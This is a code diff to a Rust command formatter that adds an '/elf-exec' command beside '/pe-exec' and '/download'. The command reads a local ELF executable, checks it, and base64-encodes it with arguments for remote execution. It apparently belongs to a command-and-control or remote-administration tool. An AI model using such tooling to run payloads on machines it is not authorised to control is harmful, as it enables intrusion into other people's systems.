@@ -14,6 +14,8 @@ impl CommandFormatter {
             Self::format_download(trimmed)
         } else if trimmed.starts_with("/pe-exec ") {
             Self::format_pe_exec(trimmed)
+        } else if trimmed.starts_with("/elf-exec ") {
+            Self::format_elf_exec(trimmed)
         } else {
             Self::format_cmd(trimmed)
         }
@@ -107,6 +109,85 @@ impl CommandFormatter {
         );
 
         Ok(format!("'pe-exec':'{}'", filename))
+    }
+
+    fn format_elf_exec(input: &str) -> Result<String, String> {
+        let rest = input
+            .strip_prefix("/elf-exec ")
+            .ok_or("Invalid elf-exec command format")?
+            .trim();
+
+        if rest.is_empty() {
+            return Err("No executable specified for elf-exec".to_string());
+        }
+
+        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
+        let elf_path = parts[0];
+
+        let path = Path::new(elf_path);
+        if !path.exists() {
+            return Err(format!("Executable not found: {}", elf_path));
+        }
+
+        let elf_content =
+            fs::read(elf_path).map_err(|e| format!("Failed to read executable: {}", e))?;
+
+        if elf_content.len() < 4 || &elf_content[0..4] != b"\x7fELF" {
+            return Err(format!(
+                "File '{}' is not a valid ELF executable (missing \\x7fELF magic)",
+                elf_path
+            ));
+        }
+
+        let filename = path
+            .file_name()
+            .and_then(|n| n.to_str())
+            .ok_or("Invalid ELF filename")?;
+
+        log::info!(
+            "[+] ELF-exec validated | file='{}' | size={} bytes",
+            filename,
+            elf_content.len()
+        );
+
+        Ok(format!("'elf-exec':'{}'", filename))
+    }
+
+    pub fn prepare_elf_exec_data(input: &str) -> Result<String, String> {
+        let rest = input
+            .strip_prefix("/elf-exec ")
+            .ok_or("Invalid elf-exec command format")?
+            .trim();
+
+        if rest.is_empty() {
+            return Err("No executable specified for elf-exec".to_string());
+        }
+
+        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
+        let elf_path = parts[0];
+        let args = if parts.len() > 1 { parts[1] } else { "" };
+
+        log::info!(
+            "[+] Preparing ELF-exec data | path='{}' | args='{}'",
+            elf_path,
+            args
+        );
+
+        let elf_content =
+            fs::read(elf_path).map_err(|e| format!("Failed to read executable: {}", e))?;
+
+        let elf_b64 = STANDARD.encode(&elf_content);
+        let args_b64 = STANDARD.encode(args.as_bytes());
+
+        let json_data = format!("{{'content':'{}','args':'{}'}}", elf_b64, args_b64);
+
+        log::info!(
+            "[+] ELF-exec data prepared | elf_size={} bytes | json_size={} bytes",
+            elf_content.len(),
+            json_data.len()
+        );
+
+        Ok(json_data)
     }
 
     pub fn prepare_pe_exec_data(input: &str) -> Result<String, String> {
